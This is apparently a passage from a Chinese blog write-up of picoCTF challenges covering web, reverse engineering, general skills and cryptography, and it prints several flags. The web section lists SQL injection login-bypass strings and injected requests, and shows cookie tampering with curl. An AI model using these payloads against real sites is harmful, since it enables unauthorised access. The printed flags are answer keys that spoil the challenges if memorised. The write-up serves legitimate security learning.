binaryString +&#x3D; &#39;1&#39; #Mark it as 1</span><br><span class="line"></span><br><span class="line">print(binaryString) #Print result</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="m00nwalk2"><em>m00nwalk2</em></span></h3><blockquote><p><a class="link" href="http://MISC-audio.md">MISC-audio.md<i class="fas fa-external-link-alt"></i></a> 中有提及。</p></blockquote><h3><span id="like1000"><em>like1000</em></span></h3><blockquote><p>[like1000](This .tar file got tarred a lot.)</p><blockquote><p>Try and script this, it’ll save you a lot of time</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import tarfile</span><br><span class="line">for i in range(1000,1,-1):</span><br><span class="line">    filename&#x3D;str(i)+&#39;.tar&#39;</span><br><span class="line">    tar&#x3D;tarfile.open(filename)</span><br><span class="line">    tar.extractall()</span><br><span class="line">    tar.close</span><br></pre></td></tr></table></figure><h3><span id="webnet0"><em>WebNet0</em></span></h3><p>学到一招，更新在（<a class="link" href="http://MISC-AboutWireshark.md">MISC-AboutWireshark.md<i class="fas fa-external-link-alt"></i></a> 中）</p><h2><span id="web-exploitation">Web Exploitation</span></h2><hr><h3><span id="insp3ct0r"></span></h3><blockquote><p>How do you inspect web code on a browser?There’s 3 parts</p></blockquote><p>ctrl+u看源码-&gt;1/3 of the flag: picoCTF{tru3_d3</p><p>mycss.css看源码-&gt; 2/3 of the flag: t3ct1ve_0r_ju5t</p><p>myjs.js看源码-&gt;3/3 of the flag: _lucky?2e7b23e3}</p><h3><span id="where-are-the-robots"></span></h3><blockquote><p>What part of the website could tell you where the creator doesn’t want you to look?</p></blockquote><p>提到robots,输入/robots.txt</p><p>得👇</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;1bb4c.html</span><br></pre></td></tr></table></figure><p>输入/1bb4c.html得flag.</p><h3><span id="dont-use-client-side"></span></h3><blockquote><p>Never trust the client</p></blockquote><p>看源码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function verify() &#123;</span><br><span class="line">    checkpass &#x3D; document.getElementById(&quot;pass&quot;).value;</span><br><span class="line">    split &#x3D; 4;</span><br><span class="line">    if (checkpass.substring(0, split) &#x3D;&#x3D; &#39;pico&#39;) &#123;</span><br><span class="line">      if (checkpass.substring(split*6, split*7) &#x3D;&#x3D; &#39;706c&#39;) &#123;</span><br><span class="line">        if (checkpass.substring(split, split*2) &#x3D;&#x3D; &#39;CTF&#123;&#39;) &#123;</span><br><span class="line">         if (checkpass.substring(split*4, split*5) &#x3D;&#x3D; &#39;ts_p&#39;) &#123;</span><br><span class="line">          if (checkpass.substring(split*3, split*4) &#x3D;&#x3D; &#39;lien&#39;) &#123;</span><br><span class="line">            if (checkpass.substring(split*5, split*6) &#x3D;&#x3D; &#39;lz_b&#39;) &#123;</span><br><span class="line">              if (checkpass.substring(split*2, split*3) &#x3D;&#x3D; &#39;no_c&#39;) &#123;</span><br><span class="line">                if (checkpass.substring(split*7, split*8) &#x3D;&#x3D; &#39;5&#125;&#39;) &#123;</span><br><span class="line">                  alert(&quot;Password Verified&quot;)</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">      </span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">      alert(&quot;Incorrect password&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>读代码，根据下标拼接flag。</p><h3><span id="logon"></span></h3><blockquote><p>Hmm it doesn’t seem to check anyone’s password, except for logon’s?</p></blockquote><p>根据提示，用logon登录后，什么都没有。但EditThisCookie中观察，多了admin的选项，将admin由False改为True后，加锁，加路径后，刷新即可得flag。👇</p><p><img lazyload src="/images/loading.svg" data-src="DL3NYF.jpg" alt="logon"></p><h3><span id="client-side-again"></span></h3><blockquote><p>What is obfuscation?</p></blockquote><h3><span id="open-to-admins"></span></h3><blockquote><p>Can cookies help you to get the flag?</p></blockquote><p>了解了传COOKIES的另一种方式：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl &quot;https:&#x2F;&#x2F;jupiter.challenges.picoctf.org&#x2F;problem&#x2F;51400&#x2F;&quot; -H &quot;Cookie:admin&#x3D;True;time&#x3D;1400;&quot; -s</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep picoCTF</span><br></pre></td></tr></table></figure><p>来搜索关键词。</p><h3><span id="picobrowser"></span></h3><blockquote><p>You don’t need to download a new web browser</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl --user-agent &quot;picobrowser&quot; &quot;https:&#x2F;&#x2F;jupiter.challenges.picoctf.org&#x2F;problem&#x2F;13759&#x2F;flag&quot; | grep picoCTF</span><br></pre></td></tr></table></figure><p>得flag所在的那一行。</p><h3><span id="irish-name-repo-1"></span></h3><blockquote><p>There doesn’t seem to be many ways to interact with this. I wonder if the users are kept in a database?Try to think about how the website verifies your login.</p></blockquote><p>由这道题了解到了网络后台的万能密码，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;or &quot;a&quot;&#x3D;&quot;a</span><br><span class="line"></span><br><span class="line">&#39;)or(&#39;a&#39;&#x3D;&#39;a</span><br><span class="line"></span><br><span class="line">or 1&#x3D;1--</span><br><span class="line"></span><br><span class="line">&#39;or 1&#x3D;1--</span><br><span class="line"></span><br><span class="line">a&#39;or&#39; 1&#x3D;1--</span><br><span class="line"></span><br><span class="line">&quot;or 1&#x3D;1--</span><br><span class="line"></span><br><span class="line">&#39;or&#39;a&#39;&#x3D;&#39;a</span><br><span class="line"></span><br><span class="line">&quot;or&quot;&#x3D;&quot;a&#39;&#x3D;&#39;a</span><br><span class="line"></span><br><span class="line">&#39;or&#39;&#39;&#x3D;&#39;</span><br><span class="line"></span><br><span class="line">&#39;or&#39;&#x3D;&#39;or&#39;</span><br><span class="line"></span><br><span class="line">1 or &#39;1&#39;&#x3D;&#39;1&#39;&#x3D;1</span><br><span class="line"></span><br><span class="line">1 or &#39;1&#39;&#x3D;&#39;1&#39; or 1&#x3D;1</span><br><span class="line"></span><br><span class="line">&#39;OR 1&#x3D;1</span><br><span class="line"></span><br><span class="line">&quot;or 1&#x3D;1</span><br><span class="line"></span><br><span class="line">&#39;xor</span><br></pre></td></tr></table></figure><p>简单来说就是在自己需要传输的命令后添加一个恒为真的值来保证执行。学到了。由此可知该题可输入的命令为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">debug&#x3D;1&amp;password&#x3D;&amp;username&#x3D;admin&#39; or &#39;1&#39;&#x3D;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username: admin&#39; or &#39;1&#39;&#x3D;&#x3D;&#39;1</span><br><span class="line">password: </span><br><span class="line">SQL query: SELECT * FROM users WHERE name&#x3D;&#39;admin&#39; or &#39;1&#39;&#x3D;&#x3D;&#39;1&#39; AND password&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure><p>得到flag.</p><h3><span id="irish-name-repo-2"></span></h3><blockquote><p>The password is being filtered.</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">debug&#x3D;1&amp;password&#x3D;1&amp;username&#x3D;admin&#39;--</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username: admin&#39;--</span><br><span class="line">password: 1</span><br><span class="line">SQL query: SELECT * FROM users WHERE name&#x3D;&#39;admin&#39;--&#39; AND password&#x3D;&#39;1&#39;</span><br></pre></td></tr></table></figure><h3><span id="irish-name-repo-3"></span></h3><blockquote><p>Seems like the password is encrypted.</p></blockquote><p>尝试</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">debug&#x3D;1&amp;password&#x3D;adsf</span><br></pre></td></tr></table></figure><p>发现回显</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password: adsf</span><br><span class="line">SQL query: SELECT * FROM admin where password &#x3D; &#39;nqfs&#39;</span><br></pre></td></tr></table></figure><p>与输入不同，可知该程序对输入值进行了某种加密。观察可得为ROT13解码，故我们可以通过ROT13加密的方式传入我们的命令。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">debug&#x3D;1&amp;password&#x3D;&#39; BE &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p>得</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password: &#39; BE &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">SQL query: SELECT * FROM admin where password &#x3D; &#39;&#39; OR &#39;1&#39;&#x3D;&#39;1&#39;</span><br></pre></td></tr></table></figure><p>得flag.</p><h2><span id="reverse-engineering">Reverse Engineering</span></h2><hr><h3><span id="vault-door-training"><em>vault-door-training</em></span></h3><blockquote><p>[vault-door-training](Your mission is to enter Dr. Evil’s laboratory and retrieve the blueprints for his Doomsday Project. The laboratory is protected by a series of locked vault doors. Each door is controlled by a computer and requires a password to open. Unfortunately, our undercover agents have not been able to obtain the secret passwords for the vault doors, but one of our junior agents obtained the source code for each vault’s computer! You will need to read the source code for each level to figure out what the password is for that vault door. As a warmup, we have created a replica vault in our training facility. The source code for the training vault is here: VaultDoorTraining.java)</p><blockquote><p>The password is revealed in the program’s source code.</p></blockquote></blockquote><p>读脚本即可解。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String input &#x3D; userInput.substring(&quot;picoCTF&#123;&quot;.length(),userInput.length()-1);</span><br><span class="line"></span><br><span class="line">public boolean checkPassword(String password) &#123;</span><br><span class="line">        return password.equals(&quot;w4rm1ng_Up_w1tH_jAv4_3808d338b46&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3><span id="vault-door-1"><em>vault-door-1</em></span></h3><blockquote><p>[vault-door-1](This vault uses some complicated arrays! I hope you can make sense of it, special agent. The source code for this vault is here: VaultDoor1.java)</p><blockquote><p>Look up the charAt() method online.</p></blockquote></blockquote><p>根据数组下标依次串联可得flag。</p><h3><span id="vault-door-3"><em>vault-door-3</em></span></h3><blockquote><p>[vault-door-3](This vault uses for-loops and byte arrays. The source code for this vault is here: VaultDoor3.java)</p><blockquote><p>Make a table that contains each value of the loop variables and the corresponding buffer index that it writes to.</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public boolean checkPassword(String password) &#123;</span><br><span class="line">        if (password.length() !&#x3D; 32) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        char[] buffer &#x3D; new char[32];</span><br><span class="line">        int i;</span><br><span class="line">        for (i&#x3D;0; i&lt;8; i++) &#123;</span><br><span class="line">            buffer[i] &#x3D; password.charAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        for (; i&lt;16; i++) &#123;</span><br><span class="line">            buffer[i] &#x3D; password.charAt(23-i);</span><br><span class="line">        &#125;</span><br><span class="line">        for (; i&lt;32; i+&#x3D;2) &#123;</span><br><span class="line">            buffer[i] &#x3D; password.charAt(46-i);</span><br><span class="line">        &#125;</span><br><span class="line">        for (i&#x3D;31; i&gt;&#x3D;17; i-&#x3D;2) &#123;</span><br><span class="line">            buffer[i] &#x3D; password.charAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        String s &#x3D; new String(buffer);</span><br><span class="line">        return s.equals(&quot;jU5t_a_sna_3lpm12g94c_u_4_m7ra41&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>理解脚本逻辑，明确</p><p>-密文长度为32位</p><p>-依次取s中的对应位数</p><p>-串联得flag</p><h3><span id="vault-door-4"><em>vault-door-4</em></span></h3><blockquote><p>[vault-door-4](This vault uses ASCII encoding for the password. The source code for this vault is here: VaultDoor4.java)</p><blockquote><p>Use a search engine to find an “ASCII table”.You will also need to know the difference between octal, decimal, and hexadecimal numbers.</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public boolean checkPassword(String password) &#123;</span><br><span class="line">        byte[] passBytes &#x3D; password.getBytes();</span><br><span class="line">        byte[] myBytes &#x3D; &#123;</span><br><span class="line">            106 , 85  , 53  , 116 , 95  , 52  , 95  , 98  ,</span><br><span class="line">            0x55, 0x6e, 0x43, 0x68, 0x5f, 0x30, 0x66, 0x5f,</span><br><span class="line">            0142, 0131, 0164, 063 , 0163, 0137, 0146, 064 ,</span><br><span class="line">            &#39;a&#39; , &#39;8&#39; , &#39;c&#39; , &#39;d&#39; , &#39;8&#39; , &#39;f&#39; , &#39;7&#39; , &#39;e&#39; ,</span><br><span class="line">        &#125;;</span><br><span class="line">        for (int i&#x3D;0; i&lt;32; i++) &#123;</span><br><span class="line">            if (passBytes[i] !&#x3D; myBytes[i]) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>依次对数组中的数据进行处理，分别为ASCII,十六进制，八进制与原字母，串联得flag.</p><h3><span id="vault-door-5"><em>vault-door-5</em></span></h3><blockquote><p>[vault-door-5](In the last challenge, you mastered octal (base 8), decimal (base 10), and hexadecimal (base 16) numbers, but this vault door uses a different change of base as well as URL encoding! The source code for this vault is here: VaultDoor5.java)</p><blockquote><p>You may find an encoder/decoder tool helpful, such as <a class="link" href="https://encoding.tools/;Read">https://encoding.tools/;Read<i class="fas fa-external-link-alt"></i></a> the wikipedia articles on URL encoding and base 64 encoding to understand how they work and what the results look like.</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public String urlEncode(byte[] input) &#123;</span><br><span class="line">        StringBuffer buf &#x3D; new StringBuffer();</span><br><span class="line">        for (int i&#x3D;0; i&lt;input.length; i++) &#123;</span><br><span class="line">            buf.append(String.format(&quot;%%%2x&quot;, input[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        return buf.toString();</span><br><span class="line">    &#125;</span><br><span class="line">public boolean checkPassword(String password) &#123;</span><br><span class="line">        String urlEncoded &#x3D; urlEncode(password.getBytes());</span><br><span class="line">        String base64Encoded &#x3D; base64Encode(urlEncoded.getBytes());</span><br><span class="line">        String expected &#x3D; &quot;JTYzJTMwJTZlJTc2JTMzJTcyJTc0JTMxJTZlJTY3JTVm&quot;</span><br><span class="line">                        + &quot;JTY2JTcyJTMwJTZkJTVmJTYyJTYxJTM1JTY1JTVmJTM2&quot;</span><br><span class="line">                        + &quot;JTM0JTVmJTM4JTM0JTY2JTY0JTM1JTMwJTM5JTM1&quot;;</span><br><span class="line">        return base64Encoded.equals(expected);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>将expected中得字符串联后，base64解密后，URL解密得flag。</p><h3><span id="vault-door-6"><em>vault-door-6</em></span></h3><blockquote><p>[vault-door-6](This vault uses an XOR encryption scheme. The source code for this vault is here: VaultDoor6.java)</p><blockquote><p>If X ^ Y = Z, then Z ^ Y = X. Write a program that decrypts the flag based on this fact.</p></blockquote></blockquote><p>根据HINT，可知该题与异或有关，转二进制后编写脚本（以下为笔者的辣鸡脚本）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">modetext&#x3D;&#39;01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010&#39;</span><br><span class="line">plaintext&#x3D;&#39;0011101101100101001000011010000000111000000000000011011000011101101000000011110101100001001001110001000101100110001001111010000000100001000111010110000100111011101000000010110101100101001001111010000001100110001101100011000001100111011011000110010001101100&#39;</span><br><span class="line">plain&#x3D;plaintext.replace(&#39; &#39;, &#39;&#39;)</span><br><span class="line">mode&#x3D;modetext.replace(&#39; &#39;,&#39;&#39;)</span><br><span class="line">print(mode)</span><br><span class="line">new&#x3D;&#39;&#39;</span><br><span class="line">for i in range(0,len(plain)):</span><br><span class="line">    if(plain[i]&#x3D;&#x3D;&#39;0&#39;):</span><br><span class="line">        new +&#x3D; mode[i]</span><br><span class="line">    elif(plain[i]&#x3D;&#x3D;&#39;1&#39;):</span><br><span class="line">        new +&#x3D; str(1-int(mode[i]))</span><br><span class="line">print(new)</span><br><span class="line">print(plain)</span><br></pre></td></tr></table></figure><p>二进制转字符后得flag.</p><h3><span id="vault-door-7"><em>vault-door-7</em></span></h3><blockquote><p>[vault-door-7](This vault uses bit shifts to convert a password string into an array of integers. Hurry, agent, we are running out of time to stop Dr. Evil’s nefarious plans! The source code for this vault is here: VaultDoor7.java)</p><blockquote><p>Use a decimal/hexadecimal converter such as this one: <a class="link" href="https://www.mathsisfun.com/binary-decimal-hexadecimal-converter.html;You">https://www.mathsisfun.com/binary-decimal-hexadecimal-converter.html;You<i class="fas fa-external-link-alt"></i></a> will also need to consult an ASCII table such as this one: <a class="link" href="https://www.asciitable.com/">https://www.asciitable.com/<i class="fas fa-external-link-alt"></i></a></p></blockquote></blockquote><p>笔者的脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x&#x3D;0</span><br><span class="line">x[0] &#x3D;1096770097</span><br><span class="line">x[1] &#x3D;1952395366</span><br><span class="line">x[2] &#x3D;1600270708</span><br><span class="line">x[3] &#x3D;1601398833</span><br><span class="line">x[4] &#x3D;1716808014</span><br><span class="line">x[5] &#x3D;1734293296</span><br><span class="line">x[6] &#x3D;842413104</span><br><span class="line">x[7] &#x3D;1684157793</span><br><span class="line">before&#x3D;&#39;&#39;</span><br><span class="line">for i in range(0,8):</span><br><span class="line">    before[i]&#x3D;x[i*4]&gt;&gt;24|x[i*4+1]&gt;&gt;16|x[i*4+2]&gt;&gt;8|x[i*4+3]</span><br><span class="line">    print(before)</span><br></pre></td></tr></table></figure><blockquote><blockquote><p>做了一连串RE题之后对编写脚本和逆向增加了一定的了解。挺好。</p></blockquote></blockquote><h2><span id="general-skills">General Skills</span></h2><hr><h3><span id="2warm"><em>2Warm</em></span></h3><blockquote><p>[2Warm]</p><blockquote><p>Can you convert the number 42 (base 10) to binary (base 2)?</p></blockquote></blockquote><p>十进制42转二进制，在线网站即可。</p><h3><span id="warmed-up"><em>Warmed Up</em></span></h3><blockquote><p>[Warmed Up]</p><blockquote><p>What is 0x3D (base 16) in decimal (base 10)?</p></blockquote></blockquote><p>十六进制转十进制，同上</p><h3><span id="lets-warm-up"><em>Lets Warm Up</em></span></h3><blockquote><p>[Lets Warm Up]</p><blockquote><p>If I told you a word started with 0x70 in hexadecimal, what would it start with in ASCII?</p></blockquote></blockquote><p>十六进制转ASCII，同上</p><h3><span id="strings-it">*strings it *</span></h3><blockquote><p>[strings it ]</p><blockquote><p>Can you find the flag in file without running it?</p></blockquote></blockquote><p>执行命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strings XXX | grep picoCTF</span><br></pre></td></tr></table></figure><p>得关键词。</p><h3><span id="bases"><em>Bases</em></span></h3><blockquote><p>[Bases]</p><blockquote><p>What does this bDNhcm5fdGgzX3IwcDM1 mean? I think it has something to do with bases.</p></blockquote></blockquote><p>Base一把梭寻找可能字符串。</p><h3><span id="first-grep"><em>First Grep</em></span></h3><blockquote><p>[First Grep]</p><blockquote><p>Can you find the flag in file? This would be really tedious to look through manually, something tells me there is a better way.</p></blockquote></blockquote><p>直接打开可得flag.</p><h3><span id="whats-a-net-cat"><em>what’s a net cat?</em></span></h3><blockquote><p>[what’s a net cat?]</p><blockquote><p>Using netcat (nc) is going to be pretty important. Can you connect to <a class="link" href="http://jupiter.challenges.picoctf.org">jupiter.challenges.picoctf.org<i class="fas fa-external-link-alt"></i></a> at port 29138 to get the flag?</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc jupiter.challenges.picoctf.org 29138</span><br></pre></td></tr></table></figure><h3><span id="plumbing"><em>plumbing</em></span></h3><blockquote><p>[plumbing]</p><blockquote><p>Sometimes you need to handle process data outside of a file. Can you find a way to keep the output from this program and search for the flag? Connect to <a class="link" href="http://jupiter.challenges.picoctf.org">jupiter.challenges.picoctf.org<i class="fas fa-external-link-alt"></i></a> 22058.</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc jupiter.challenges.picoctf.org 22058 |grep picoCTF</span><br></pre></td></tr></table></figure><p>同前题</p><h3><span id="based"><em>Based</em></span></h3><blockquote><p>[Based]</p><blockquote><p>To get truly 1337, you must understand different data encodings, such as hexadecimal or binary. Can you get the flag from this program to prove you are on the way to becoming 1337? Connect with nc <a class="link" href="http://jupiter.challenges.picoctf.org">jupiter.challenges.picoctf.org<i class="fas fa-external-link-alt"></i></a> 9670.</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># nc jupiter.challenges.picoctf.org 9670</span><br><span class="line">Let us see how data is stored</span><br><span class="line">pie</span><br><span class="line">Please give the 01110000 01101001 01100101 as a word.</span><br><span class="line">...</span><br><span class="line">you have 45 seconds.....</span><br><span class="line"></span><br><span class="line">Input:</span><br><span class="line">pie</span><br><span class="line">Please give me the  163 157 143 153 145 164 as a word.</span><br><span class="line">Input:</span><br><span class="line">socket</span><br><span class="line">Please give me the 636f6c6f7261646f as a word.</span><br><span class="line">Input:</span><br><span class="line">colorado</span><br><span class="line">You&#39;ve beaten the challenge</span><br><span class="line">Flag: picoCTF&#123;learning_about_converting_values_b375bb16&#125;</span><br></pre></td></tr></table></figure><p>二进制八进制十六进制转换。</p><h3><span id="mus1c"><em>mus1c</em></span></h3><blockquote><p>[mus1c](I wrote you a song. Put it in the picoCTF{} flag format.)</p><blockquote><p>Do you think you can master rockstar?</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Pico&#39;s a CTFFFFFFF</span><br><span class="line">my mind is waitin</span><br><span class="line">It&#39;s waitin</span><br><span class="line"></span><br><span class="line">Put my mind of Pico into This</span><br><span class="line">my flag is not found</span><br><span class="line">put This into my flag</span><br><span class="line">put my flag into Pico</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shout Pico</span><br><span class="line">shout Pico</span><br><span class="line">shout Pico</span><br><span class="line"></span><br><span class="line">My song&#39;s something</span><br><span class="line">put Pico into This</span><br><span class="line"></span><br><span class="line">Knock This down, down, down</span><br><span class="line">put This into CTF</span><br><span class="line"></span><br><span class="line">shout CTF</span><br><span class="line">my lyric is nothing</span><br><span class="line">Put This without my song into my lyric</span><br><span class="line">Knock my lyric down, down, down</span><br><span class="line"></span><br><span class="line">shout my lyric</span><br><span class="line"></span><br><span class="line">Put my lyric into This</span><br><span class="line">Put my song with This into my lyric</span><br><span class="line">Knock my lyric down</span><br><span class="line"></span><br><span class="line">shout my lyric</span><br><span class="line"></span><br><span class="line">Build my lyric up, up ,up</span><br><span class="line"></span><br><span class="line">shout my lyric</span><br><span class="line">shout Pico</span><br><span class="line">shout It</span><br><span class="line"></span><br><span class="line">Pico CTF is fun</span><br><span class="line">security is important</span><br><span class="line">Fun is fun</span><br><span class="line">Put security with fun into Pico CTF</span><br><span class="line">Build Fun up</span><br><span class="line">shout fun times Pico CTF</span><br><span class="line">put fun times Pico CTF into my song</span><br><span class="line"></span><br><span class="line">build it up</span><br><span class="line"></span><br><span class="line">shout it</span><br><span class="line">shout it</span><br><span class="line"></span><br><span class="line">build it up, up</span><br><span class="line">shout it</span><br><span class="line">shout Pico</span><br></pre></td></tr></table></figure><p>根据hint搜索rockstar,得一<a class="link" href="https://codewithrockstar.com/online">在线网站<i class="fas fa-external-link-alt"></i></a>，解密得</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">114</span><br><span class="line">114</span><br><span class="line">114</span><br><span class="line">111</span><br><span class="line">99</span><br><span class="line">107</span><br><span class="line">110</span><br><span class="line">114</span><br><span class="line">110</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">49</span><br><span class="line">51</span><br><span class="line">114</span><br><span class="line">Program completed in 361 ms</span><br></pre></td></tr></table></figure><p>转ASCII得flag.</p><h3><span id="1_wanna_b3_a_r0ck5tar"><em>1_wanna_b3_a_r0ck5tar</em></span></h3><blockquote><p>[1_wanna_b3_a_r0ck5tar]</p><blockquote><p>I wrote you another song. Put the flag in the picoCTF{} flag format</p></blockquote></blockquote><p>上题的方法失败读脚本通过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rocknroll is right              </span><br><span class="line">Silence is wrong                </span><br><span class="line">A guitar is a six-string </span><br></pre></td></tr></table></figure><p>等，猜测为类似伪代码，更改运行可得flag.</p><h2><span id="cryptography">Cryptography</span></h2><hr><h3><span id="the-numbers"><em>The Numbers</em></span></h3><blockquote><p><a class="link" href="https://play.picoctf.org/practice/challenge/68?category=2&amp;page=1">The Numbers<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>The flag is in the format PICOCTF{}</p></blockquote></blockquote><p>得到一串数字</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">16 9 3 15 3 20 6 &#123; 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14 &#125;</span><br></pre></td></tr></table></figure><p>根据hint，对照ASCII，已知部门为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">80 73 67 79 67 84 70 &#123; &#125;</span><br></pre></td></tr></table></figure><p>编写脚本，思路为after=before+64，或者手动加工也可得到flag.</p><h3><span id="caesar"><em>caesar</em></span></h3><blockquote><p><a class="link" href="https://play.picoctf.org/practice/challenge/64?category=2&amp;page=1">caesar<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>caesar cipher tutorial</p></blockquote></blockquote><p>在线网站或者脚本都可解密，遍历后选取相对有意思的字符即是flag.</p><h3><span id="easy1"><em>Easy1</em></span></h3><blockquote><p><a class="link" href="https://play.picoctf.org/practice/challenge/43?category=2&amp;page=1">Easy1<i class="fas fa-external-link-alt"></i></a></p><blockquote><p>The one time pad can be cryptographically secure, but not when you know the key. Can you solve this? We’ve given you the encrypted flag, key, and a table to help UFJKXQZQUNB with the key of SOLVECRYPTO. Can you use this table to solve it?.</p></blockquote></blockquote><blockquote><blockquote><p>Submit your answer in our flag format. For example, if your answer was ‘hello’, you would submit ‘picoCTF{HELLO}’ as the flag.Please use all caps for the message.</p></blockquote></blockquote><p>据题意，已知该加密方式拥有明文和密钥，结合给出的字典，确定为维吉尼亚编码，在线网站或脚本都可解密得flag。</p><h3><span id="13"><em>13</em></span></h3><blockquote><p>[13](Cryptography can be easy, do you know what ROT13 is? cvpbPGS{abg_gbb_onq_bs_n_ceboyrz})</p><blockquote><p>This can be solved online if you don’t want to do it by hand!</p></blockquote></blockquote><p>题目描述可知加密方式为ROT13,在线网站或脚本即可解密。</p><h3><span id="la-cifra-de"><em>la cifra de</em></span></h3><blockquote><p>[la cifra de](I found this cipher in an old book. Can you figure out what it says? Connect with nc <a class="link" href="http://jupiter.challenges.picoctf.org">jupiter.challenges.picoctf.org<i class="fas fa-external-link-alt"></i></a> 50523)</p><blockquote><p>There are tools that make this easy.Perhaps looking at history will help</p></blockquote></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Encrypted message:</span><br><span class="line">Ne iy nytkwpsznyg nth it mtsztcy vjzprj zfzjy rkhpibj nrkitt ltc tnnygy ysee itd tte cxjltk</span><br><span class="line"></span><br><span class="line">Ifrosr tnj noawde uk siyyzre, yse Bnretèwp Cousex mls hjpn xjtnbjytki xatd eisjd</span><br><span class="line"></span><br><span class="line">Iz bls lfwskqj azycihzeej yz Brftsk ip Volpnèxj ls oy hay tcimnyarqj dkxnrogpd os 1553 my Mnzvgs Mazytszf Merqlsu ny hox moup Wa inqrg ipl. Ynr. Gotgat Gltzndtg Gplrfdo </span><br><span class="line"></span><br><span class="line">Ltc tnj tmvqpmkseaznzn uk ehox nivmpr g ylbrj ts ltcmki my yqtdosr tnj wocjc hgqq ol fy oxitngwj arusahje fuw ln guaaxjytrd catizm tzxbkw zf vqlckx hizm ceyupcz yz tnj fpvjc hgqqpohzCZK&#123;m311a50_0x_a1rn3x3_h1ah3x6kp60egf&#125;</span><br><span class="line"></span><br><span class="line">Ehk ktryy herq-ooizxetypd jjdcxnatoty ol f aordllvmlbkytc inahkw socjgex, bls sfoe gwzuti 1467 my Rjzn Hfetoxea Gqmexyt.</span><br><span class="line"></span><br><span class="line">Tnj Gimjyèrk Htpnjc iy ysexjqoxj dosjeisjd cgqwej yse Gqmexyt Doxn ox Fwbkwei Inahkw.</span><br><span class="line"></span><br><span class="line">Tn 1508, Ptsatsps Zwttnjxiax tnbjytki ehk xz-cgqwej ylbaql rkhea (g rltxni ol xsilypd gqahggpty) ysaz bzuri wazjc bk f nroytcgq nosuznkse ol yse Bnretèwp Cousex.</span><br><span class="line"></span><br><span class="line">Gplrfdo’y xpcuso butvlky lpvjlrki tn 1555 gx l cuseitzltoty ol yse lncsz. Yse rthex mllbjd ol yse gqahggpty fce tth snnqtki cemzwaxqj, bay ehk fwpnfmezx lnj yse osoed qptzjcs gwp mocpd hd xegsd ol f xnkrznoh vee usrgxp, wnnnh ify bk itfljcety hizm paim noxwpsvtydkse.</span><br></pre></td></tr></table></figure><p><a class="link" href="https://www.guballa.de/vigenere-solver">在线网站<i class="fas fa-external-link-alt"></i></a>维吉尼亚解密可得flag.</p><blockquote><p>词频分析搞了半天，555</p></blockquote><h3><span id="rsa-pop-quiz"><em>rsa-pop-quiz</em></span></h3><blockquote><p>[rsa-pop-quiz](Class, take your seats! It’s PRIME-time for a quiz… nc <a class="link" href="http://jupiter.challenges.picoctf.org">jupiter.challenges.picoctf.org<i class="fas fa-external-link-alt"></i></a> 